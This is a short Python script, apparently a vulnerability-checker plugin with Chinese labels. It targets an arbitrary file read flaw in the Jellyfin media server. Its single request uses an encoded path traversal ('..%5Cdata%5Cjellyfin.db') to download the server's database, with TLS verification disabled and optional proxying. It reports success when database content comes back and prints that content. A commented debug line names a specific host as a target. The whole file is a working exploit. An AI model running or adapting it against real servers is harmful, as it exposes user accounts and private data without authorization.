import requests
import re
from bs4 import BeautifulSoup
import logging

uia = ''
http = ''
https = ''
def dl201(dl):
    global http,https
    http=dl
    https=dl
def ty(url,s_cookie=None):
    global uia
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        logging.captureWarnings(True)
        #-------------------------------以下可修改
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        }
        gf = requests.get(url+"Audio/anything/hls/..%5Cdata%5Cjellyfin.db/stream.mp3/",cookies=s_cookie,headers=headers,proxies=proxies,verify=False)
        if gf.status_code == 200 and 'RowVersion' in gf.text:
            uia = "[+]漏洞存在\nAudio/anything/hls/..%5Cdata%5Cjellyfin.db/stream.mp3/\n"+gf.text
        else:
            uia='[-]漏洞不存在'
        # -------------------------------
    except Exception as aaa:
        uia = '[-]请求错误\n' + str(aaa)
#----------------调试
# ty('https://jellyfin.timbeck2.com/')
# print(uia)
#----------------
def yt1():
    global uia
    return '--------------------------------------------------\n[ Jellyfin 任意文件读取漏洞 ]\n\n'+ str (uia)+'\n'
def yt1a(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        ty(url1,s_cookie)
    elif pd=='1':
        ty(url1,s_cookie)